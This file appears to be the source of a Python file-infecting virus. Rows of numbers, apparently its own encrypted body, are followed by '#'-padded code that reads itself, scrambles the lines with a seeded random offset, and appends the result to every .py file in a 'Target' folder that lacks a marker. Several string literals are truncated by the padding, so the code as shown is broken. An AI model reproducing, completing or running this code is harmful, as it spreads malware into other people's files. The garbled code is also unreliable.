247	188	245	206	175	200	114	46	162	231	249	164	197	240	105	66	106	135	112	142	204	98	70	193	244	76	21	107	244	207	44	0	225	61	216	60	23	226	37	242	157	94	144	162	219	64	171	67	176	133	101	163	192	213	198	122	205	83
244	24	116	136	36	125	15	242	94	138	199	190	167	73	27	45	105	241	27	235	128	135	163	112	91	143	60	191	196	196	60	117	249	82	194	163	241	24	73	78	158	150	170	118	186	60	28	236	28	148	243	6	74	14	146	152	26	197
201	39	126	71	141	28	118	232	1	42	188	219	8	254	217	8	82	89	40	133	126	9	16	7	105	22	10	41	185	169	129	39	18	207	203	143	61	171	85	42	49	92	20	189	139	85	48	12	148	50	239	97	254	64	65	131	169	172
28	35	68	60	35	32	157	131	250	20	11	92	20	174	236	108	3	86	95	172	159	72	250	193	137	26	222	100	144	112	185	77	2	3	233	113	108	119	197	31	179	243	68	155	121	112	155	253	199	5	100	182	159	32	163	132	225	38
164	20	104	140	79	76	254	156	190	144	6	135	193	22	83	16	187	174	176	196	242	2	157	64	167	234	222	226	201	231	13	48	3	79	198	239	139	196	41	53	65	215	30	241	251	167	189	9	118	247	144	131	141	220	135	152	229	71
96	206	41	168	23	81	156	168	230	7	40	211	51	42	100	16	217	6	241	141	127	110	44	27	82	49	105	82	209	109	132	249	84	167	196	182	236	183	119	121	181	4	62	79	186	168	194	228	169	52	50	180	71	63	175	185	214	25
140	87	54	222	49	100	89	26	95	32	144	65	90	37	187	56	172	139	121	39	158	85	181	201	16	138	238	106	154	157	176	97	213	17	193	196	201	43	2	80	231	36	15	88	202	200	14	64	28	82	18	187	97	113	71	199	54	113
217	6	75	157	154	40	123	92	74	71	235	154	12	98	204	11	239	22	86	2	222	164	201	104	146	67	6	222	2	61	136	97	162	37	167	61	168	220	254	232	58	42	47	200	199	123	218	197	157	171	5	7	91	100	47	105	11	113
79	108	113	189	34	45	45	170	175	159	135	120	41	18	202	111	22	148	251	220	168	7	19	80	123	88	161	34	162	194	87	167	166	200	9	168	235	39	10	172	117	143	144	88	51	218	93	55	131	216	202	151	142	124	118	39	29	51
81	65	70	203	90	134	123	146	64	190	255	227	132	190	7	209	13	184	232	198	29	154	13	185	247	145	121	253	193	16	193	66	204	103	202	54	37	190	86	78	220	93	143	79	224	115	31	22	197	104	4	22	146	150	249	50	157	133
69	243	159	18	2	8	205	33	6	133	196	243	246	142	87	181	77	47	114	182	248	211	39	143	64	26	180	97	220	167	221	189	151	51	161	47	33	71	254	51	236	212	147	170	174	181	65	37	166	222	41	149	102	7	53	196	80	223
49	134	185	163	213	106	221	78	163	250	1	228	172	124	202	86	120	12	191	92	119	82	61	138	138	154	224	181	31	35	69	255	10	119	86	204	30	236	37	244	12	135	50	94	47	172	201	133	127	136	232	96	172	145	138	167	104	220
106	188	75	76	23	185	240	247	22	208	237	224	247	237	63	12	186	160	237	15	235	252	109	196	32	41	247	103	230	56	56	250	183	202	77	253	67	36	235	176	211	22	64	243	204	200	155	105	101	1	195	66	160	100	108	212	163	46
143	208	244	79	162	197	72	247	31	39	232	210	3	183	84	84	49	89	118	68	124	150	73	26	60	196	33	20	251	114	133	10	27	197	113	20	155	176	145	197	132	58	83	247	142	13	78	157	47	46	38	108	81	210	140	202	50	65
21	97	121	105	248	66	60	204	231	21	219	0	93	198	203	224	95	185	169	7	74	109	63	152	161	47	127	246	254	171	130	196	178	130	69	182	134	102	116	225	215	63	192	233	168	51	168	31	189	127	161	75	53	178	218	33	251	246
206	126	235	98	133	98	181	141	143	248	36	130	205	85	98	14	141	82	2	167	196	42	220	215	30	36	192	254	231	187	98	116	163	148	151	229	197	99	110	197	77	78	208	119	112	209	184	251	137	141	230	85	235	35	30	15	176	240
100	185	51	184	95	12	136	255	159	213	137	77	73	77	69	253	200	241	42	216	86	221	213	17	112	202	136	117	14	138	64	22	213	123	191	179	203	146	14	53	122	234	9	180	110	148	196	32	1	136	42	173	227	190	45	247	99	181
148	214	131	75	247	88	2	204	3	68	132	8	152	15	151	48	160	31	91	158	77	42	6	19	104	23	164	144	114	139	137	156	35	55	21	154	51	245	84	249	251	229	111	82	225	188	72	60	245	201	160	123	0	106	110	23	65	48
243	1	35	113	216	228	28	165	29	148	92	75	193	25	46	194	248	110	64	63	95	249	179	81	217	56	231	203	76	19	76	142	205	155	137	169	0	192	84	147	237	62	30	44	96	239	36	224	4	116	48	147	189	44	247	30	252	54
19	250	20	64	184	157	153	33	74	176	39	32	50	61	241	60	89	4	48	254	223	222	158	129	224	107	87	74	20	66	104	51	229	72	192	193	7	117	154	205	149	151	195	144	73	129	146	254	245	245	228	49	57	59	6	97	243	191
214	193	224	19	53	152	101	208	235	145	99	101	173	33	221	152	250	206	49	54	34	250	73	115	186	196	17	242	123	91	42	16	159	90	116	111	15	159	175	23	114	76	209	160	16	155	194	192	19	245	255	132	139	216	49	156	233	33
171	41	146	128	173	35	97	40	132	235	198	82	28	5	40	200	75	21	203	48	61	78	128	162	22	242	103	114	243	58	17	211	46	72	110	110	2	128	101	104	66	29	44	215	226	190	248	191	238	125	113	40	179	11	123	27	247	216
226	74	55	104	91	170	77	126	87	151	41	49	193	36	74	9	132	25	234	71	247	54	184	38	96	41	216	219	135	21	102	177	8	138	161	211	68	209	146	219	53	221	147	202	32	229	213	188	30	161	89	37	162	244	171	90	74	206
81	105	254	136	246	130	140	39	241	110	2	184	184	99	19	226	218	93	59	102	25	93	58	242	50	70	183	151	135	73	12	21	133	53	88	42	90	194	0	164	27	252	111	215	73	76	237	30	135	42	129	27	82	208	218	253	40	159
67	119	160	52	122	74	74	115	91	163	181	79	148	1	160	31	34	185	51	99	173	81	51	192	125	82	145	64	75	60	55	250	219	247	119	82	188	166	180	114	1	112	118	233	146	77	249	141	254	41	18	187	100	43	169	10	116	35
96	95	54	153	47	158	155	64	54	56	193	59	183	168	111	45	230	221	24	184	201	204	108	117	1	222	197	83	100	31	175	13	116	230	109	217	67	134	105	123	72	235	182	36	180	107	29	201	0	26	33	96	202	94	16	1	52	242
#!::V::!##################################################
import glob ##############################################
import random ############################################
from string import * #####################################
files = glob.iglob('.\Target\*.py') ######################
with open(__file__, 'r') as source_file: #################
    source = source_file.readlines() #####################
source_byte = [bytearray(b'###############################
line_max = 0 #############################################
for line in source:#######################################
    vstr = line.find('####################################
    if vstr!=-1:##########################################
        line_byte= bytearray(line[:vstr], 'utf-8')########
        line_max = max(line_max, len(line_byte))##########
        source_byte.append(line_byte) ####################
random.seed(17)###########################################
for line in source_byte:##################################
    line.extend([35 for i in range(line_max - len(line))])
    for i in range(len(line)):############################
        line[i] = (line[i] + random.randrange(0,256))%256#
for file in files: #######################################
    with open(file,'r') as victim: #######################
        victim_read = victim.read() ######################
    if victim_read.find('#################################
        with open(file,'ab') as victim: ##################
            victim.writelines(source_byte) ###############
